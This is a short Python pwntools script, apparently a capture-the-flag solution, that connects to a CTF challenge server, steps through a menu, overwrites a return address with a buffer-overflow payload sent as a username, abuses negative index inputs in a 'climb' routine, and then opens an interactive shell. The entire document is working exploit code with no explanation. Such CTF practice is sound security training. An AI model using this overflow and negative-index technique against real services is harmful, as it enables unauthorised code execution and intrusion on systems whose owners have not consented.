from pwn import *

p = remote("cop.ichsa.ctf.today",8011)



def win_2(p):
    payload = "AAAAAABBBBBBBBCCCCCCCC"+p64(0x4017ad+102)
    p.sendlineafter("[","2")
    p.sendlineafter("[","3")

    p.sendlineafter("[","2")
    p.sendlineafter("[","3")

    p.sendlineafter("[","2")
    p.sendlineafter("[","2")

    p.sendlineafter("[","2")
    p.sendlineafter("[","3")

    p.sendlineafter("[","2")
    p.sendlineafter("[","3")

    p.sendlineafter("[","2")
    p.sendlineafter("[","3")

    p.sendlineafter("[","4")

    p.sendlineafter("[","5")
    p.sendlineafter("username: ",str(payload))


def climb(p):
    for _ in range(8):
        p.sendlineafter("[","3")
        p.sendlineafter("[","-1")
    p.sendlineafter("[","3")
    p.sendlineafter("[","-82")

win_2(p)
climb(p)
p.interactive()